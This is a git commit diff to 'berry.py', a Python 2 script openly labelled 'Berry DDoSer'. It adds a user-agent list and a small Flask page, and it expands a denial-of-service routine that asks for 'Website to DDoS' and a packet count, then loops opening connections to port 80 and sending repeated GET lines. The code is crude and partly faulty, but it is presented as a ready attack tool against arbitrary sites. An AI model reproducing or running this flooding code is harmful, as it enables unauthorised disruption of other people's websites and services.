535ff7a764c5598287d0ed736526440b51a8e30f
MattPerez <mattrock000@outlook.com>
2015-07-07 16:20:22 -0400

    Berry DDoSer v0.0.1

--- berry/berry.py
+++ berry/berry.py
@@ -2,17 +2,30 @@
 """
 """
 import time, socket, os, sys, string, random, subprocess
+import httplib
 from flask import Flask
 from colorama import *
 init()
 
+# generates a user agent array
+def user_agent():
+	global uagent
+	uagent=[]
+	uagent.append("uagent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("uagent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+	return(uagent)
 
-# useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+#Extra Shizzzz / Not really important :/
 version = "0.0.1]"
-
 subprocess.call('clear', shell=True)
 
 def main():
+	#Main Banner
 	print(Fore.RED + "\t  ,/         \.  ")
 	print("\t ((           )) ")
 	print("\t  \`.       ,'   ")
@@ -31,7 +44,7 @@ def main():
 	print("\t    `.     ,'    ")
 	print("\t      `-.-'      ")
 	print("\t             [v" + version)
-	
+		#Menu when loaded
         print "\nSelect option:"
         print
         print "\t [1] Berry DDoSer"
@@ -45,53 +58,72 @@ def main():
 
         if choice == '1':
         	print ("[!] DDoS Mode Loaded")
-        	host = raw_input('Host: ')
+        	#params for dos
+        	host = raw_input('Website to DDoS: ')
         	port = 80
-        	conn = raw_input("How many packets: ")
+        	conn = raw_input("Number of Packets: ")
         	message = "#strrrry is an eGod"
         	ip = socket.gethostbyname( host )
 
-        	def dos():
+        	def dos_it():
         		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         		try:
+        			#start ddos attack
         			ddos.connect((host, 80))
         			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
 			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
 			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
         		except socket.error, msg:
         			print("[!] [Connection Failed]")
-        		print("[DDoS Attack Serving on port: %s...]" % port)
+        		print("[DDoS Attack Serving on port: %s..]" % port)
         		ddos.close()
         	
         	for i in xrange(int(conn)):
-        		dos()
+        		dos_it()
 
         if choice == '2':
+        	#Run webgui
 			app = Flask(__name__)
 
 			@app.route("/")
 			def web_start():
 			    return '''
-			    <html>
-			    <head>
-			    <style>
-			    body{
-			    background-color: black;
+			   <html>
+				<head>
+					<style>
+					 body{
+					 	background-color: black;
+					}
+				</style>
+				</head>
+				<body>
+				<center>
+					<h1 style="color: red;">Berry DDoSer</h1>
+				    <h2 style="color: white;" id="ipaddress"></h2>
+				</center>
+				</body>
+				<script>
+					window.onload = function () {
+			        var script = document.createElement("script");
+			        script.type = "text/javascript";
+			        script.src = "http://www.telize.com/jsonip?callback=DisplayIP";
+			        document.getElementsByTagName("head")[0].appendChild(script);
+			    };
+			    function DisplayIP(response) {
+			        document.getElementById("ipaddress").innerHTML = "Your IP Address is " + response.ip;
 			    }
-			    </style>
-			    </head>
-			    <body>
-			    <center>
-			    	<h1 style="color: red;">Berry DDoSer</h1>
-			    	</center>
-			    </body>
-			    </html>
+				</script>
+				</html>
 			    '''
 
 			if __name__ == "__main__":
-			    app.run()
+				app.run()
 
-        if choice == "exit" or choice == '0':
+        if choice == "exit" or choice == '0' or choice == '':
+        	#exit in any case
             raw_input("\t[!] Quiting Session...")
             print("\n[!] Session Closed.")
             exit()
